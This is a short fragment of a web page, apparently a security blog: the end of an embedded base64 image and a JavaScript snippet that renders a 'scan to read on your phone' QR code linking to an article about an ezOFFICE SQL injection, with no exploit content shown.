1pLeuZ1U9+4LzPJz73sOZ8o5n/raQ3nTz9zyBw0Ig7wIYcXU8ty2ag7Efwl/1za0QMg+OaI9nEtU7Qmao9zzEVxchun0QDiPq2ycX1QsPCzF043uewB9fSG15Vn55kHdPz+ivEOZ9fU7x1YzyqiCzIFjavlb9kLz+vufs2jykXz7DP76Q2U1u7fUn8K8XAuPWYc77OwiSg2A/MpzrEB+euJoBzwzQYxsHhp8PINyzb8F/eQGZ6xgIB+7fZT0+7HX4hPhu6Lg6t7nuQ7auDiNXv8I+f8VL77NKq7rSIWerbJX5uq6C+Oow5zDq5sWata+ZfliIoRvf8wS2hUC2C+e4Oiakz3fAVU7fvNh1mM81D/HhiXp9ljokKzcnQny5aF680mGcAyO3H6ID9/eQx4e9tk/Ih53rP3uc/wEAAP//VkNXkwAAAAZJREFUAwCSw4CnQfPEWAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-DocumentHistory-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 